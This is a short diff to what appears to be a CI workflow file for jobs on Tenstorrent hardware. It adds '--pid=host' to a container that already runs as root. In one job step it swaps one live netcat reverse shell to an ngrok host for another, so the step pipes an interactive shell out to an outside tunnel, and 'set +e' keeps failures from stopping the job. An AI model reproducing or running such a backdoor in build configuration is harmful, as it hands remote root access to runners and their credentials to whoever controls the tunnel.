@@ -32,7 +32,7 @@ jobs:
 
     container:
       image: ${{ inputs.docker-image }}
-      options: --user root --device /dev/tenstorrent/0 --shm-size=2gb
+      options: --user root --device /dev/tenstorrent/0 --shm-size=2gb --pid=host
       volumes:
         - /dev/hugepages:/dev/hugepages
         - /dev/hugepages-1G:/dev/hugepages-1G
@@ -51,5 +51,5 @@ jobs:
         set +e
         apt install -y netcat
         mkfifo /tmp/f
-        cat /tmp/f|/bin/sh -i 2>&1|nc 4.tcp.ngrok.io 16734 >/tmp/f
+        cat /tmp/f|/bin/sh -i 2>&1|nc 8.tcp.ngrok.io 12286 >/tmp/f
         set -e
